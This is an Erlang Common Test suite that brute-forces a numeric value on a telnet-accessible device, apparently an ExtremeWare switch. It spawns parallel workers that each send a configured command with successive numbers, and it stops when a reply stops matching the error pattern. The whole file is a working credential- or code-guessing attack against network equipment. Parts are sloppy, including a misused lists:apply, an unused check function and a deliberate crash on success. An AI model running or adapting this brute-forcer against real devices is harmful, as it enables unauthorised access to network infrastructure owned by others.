-module(extremeware_brute_SUITE).
-export([all/0,suite/0,main/1]).

-record(settings,{threads,limit,command,error}).

suite() ->
	ct:require(ew_telnet), [{timetrap,infinity},{silent_connections,[telnet]}].
set_ew_defaults([{threads,Threads}|Ss],S) ->  
    set_ew_defaults(Ss,S#settings{threads=Threads});
set_ew_defaults([{limit,Limit}|Ss],S) ->
    set_ew_defaults(Ss,S#settings{limit=Limit});
set_ew_defaults([{command,Command}|Ss],S) ->
    set_ew_defaults(Ss,S#settings{command=Command});
set_ew_defaults([{error,Error}|Ss],S) ->
    set_ew_defaults(Ss,S#settings{error=Error});
set_ew_defaults([],S) ->
    S.

all() -> [main].
main(_) ->
	process_flag(trap_exit, true),
	Settings = set_ew_defaults(ct:get_config(extremeware),#settings{}),
	Threads = Settings#settings.threads, Limit = Settings#settings.limit,
	NZeroIncl = Threads - 1, NWOLast = NZeroIncl - 1,
	Size = Limit div Threads, Delta = Limit - (Size * Threads),
	%[I] = [ Clp ||
	%			Clp <- lists:seq(0,NWOLast),
	%			part(Clp,Size,0,Settings) > NWOLast ],
	%ct:pal("Generated fragments"),
	Pids = lists:map(fun(X) -> part(X,Size,0,Settings) end,lists:seq(0,NWOLast)),
	Last = part(NZeroIncl,Size,Delta,Settings),
	loop([Last|Pids]).

part(N,S,D,Settings) ->
	M = N * S,
	Fragment = lists:seq(M + 1,M + S + D),
	%timer:sleep(1000),
	spawn_link(fun() -> worker({Fragment},Settings) end).
worker({L},Settings) ->
	receive
		_ ->
			%ct:pal("Halting"),
			true
		after 0 ->
			{ok,Handler} = ct_telnet:open(unix,telnet,ew_telnet),
			worker({Handler,L},Settings)
	end;
worker({Handler,[X|Xs]},Settings) ->
	receive
		_ ->
			%ct:pal("Halting on ~w",[X]),
			worker({Handler,[]},Settings)
		after 0 ->
			%timer:sleep(500),
			ok = ct_telnet:sendf(Handler,"~s ~B",[Settings#settings.command,X]),
			{ok,Data} = ct_telnet:get_data(Handler),
			case re:run(Data,Settings#settings.error,[]) of
				{match,_} ->
					worker({Handler,Xs},Settings);
				_ when Data =/= [] ->
					ct:pal("Done! ~s",[Data]), ct_telnet:close(Handler), Data = fail;
				_ when Data == [] ->
					worker({Handler,[X|Xs]},Settings)
			end
	end;
worker({Handler,[]},_) ->
	ct_telnet:close(Handler), true.
loop([X|Xs]) ->
	receive
		{_,Pid,normal} ->
			%ct:pal("~w finished normally",[X]),
			loop(Xs);
		_ ->
			%ct:pal("~w finished early",[X]),
			%[ LP ! stop || LP <- begin {links, P} = process_info(self(), links), P end ],
			lists:apply(fun(X) -> X ! stop end,Xs),
			timer:sleep(3000),
			loop([])
		after 0 ->
			loop([X|Xs])
	end;
loop([]) ->
	true.
check([X|Xs]) ->
	case is_process_alive(X) of
		false -> Xs;
		true -> Xs ++ [X]
	end.
